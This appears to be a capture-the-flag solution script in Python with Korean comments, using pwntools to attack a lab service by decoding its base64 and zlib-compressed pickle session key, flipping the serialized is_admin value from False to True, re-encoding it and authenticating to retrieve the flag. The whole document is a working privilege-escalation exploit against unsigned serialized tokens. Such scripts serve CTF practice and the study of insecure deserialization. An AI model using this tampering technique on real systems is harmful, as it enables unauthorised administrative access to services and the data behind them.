import pickle
import zlib
import base64
import pickletools
from pwn import *

r = remote('172.21.0.2', 13000)

#1. generated key
r.sendlineafter('>> ', b'1')
r.sendlineafter('Username', b'123')
r.sendlineafter('Password', b'321')
key = r.recvuntil('\n')[8:-1].decode()
print("Key" + key)

#decode and decompress
userInput = base64.b64decode(key)
userInput = zlib.decompress(userInput)

#print(pickle.loads(userInput)) -> error

#따라서 userInput을 파일로 저장한 뒤에, 
#Hxd를 통해 is_admin에 위치하는 False 값을 
#True의 바이트코드로 변환 (\x89 -> \x88))하거나
#파이썬 이용


#pickletools를 통해 is_admin의 자리에서 False의 바이트코드 인덱스 확인
print(pickletools.dis(userInput)) #-> 81(0x89 == NEWFALSE)
userInput = bytearray(userInput)
#print(userInput)
userInput[81] = 0x88 #bytecode 조작 (0x89 == NEWFALSE -> 0x88 == NEWTRUE)

#변환된 pickle 코드를 zlib로 compress하고, base64로 인코딩한 후에, 서버로 전송(2번 Authenticate)
userInput = zlib.compress(userInput)
userInput = base64.b64encode(userInput)
print(userInput)

#2. Authenticate
r.sendlineafter(">> ", b'2')
r.sendlineafter(">> ",userInput)
#flag 획득
r.recvuntil('\n')
flag = r.recvuntil('}').decode()
print("FLAG : " + flag)